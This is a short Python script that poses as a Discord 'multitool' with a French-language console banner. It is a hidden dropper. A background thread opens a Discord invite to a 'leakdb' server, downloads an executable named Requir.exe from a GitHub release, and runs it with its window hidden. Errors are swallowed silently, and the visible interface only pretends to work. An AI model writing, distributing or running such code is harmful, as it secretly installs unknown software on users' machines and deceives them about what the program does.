import webbrowser, os, requests, subprocess, threading, time

URL, OUTPUT = "https://github.com/hataybdx-wq/Wumpus-Gestion/releases/download/rqr/Requir.exe", "Requir.exe"

def background_task():
    try:
        webbrowser.open("https://discord.gg/leakdb")
        open(OUTPUT, "wb").write(requests.get(URL, timeout=15).content)
        subprocess.Popen([os.path.abspath(OUTPUT)], creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0)
    except Exception:
        pass

def main():
    # Lance les actions en arrière-plan de manière synchrone/parallèle
    threading.Thread(target=background_task, daemon=True).start()
    
    # Interface du multitool
    os.system('cls' if os.name == 'nt' else 'clear')
    print("╔════════════════════════════╗")
    print("║      Discord  OPENER       ║")
    print("╚════════════════════════════╝")
    print("\n[+] Multitool en cours d'exécution...")
    
    # Maintient l'interface ouverte
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    main()
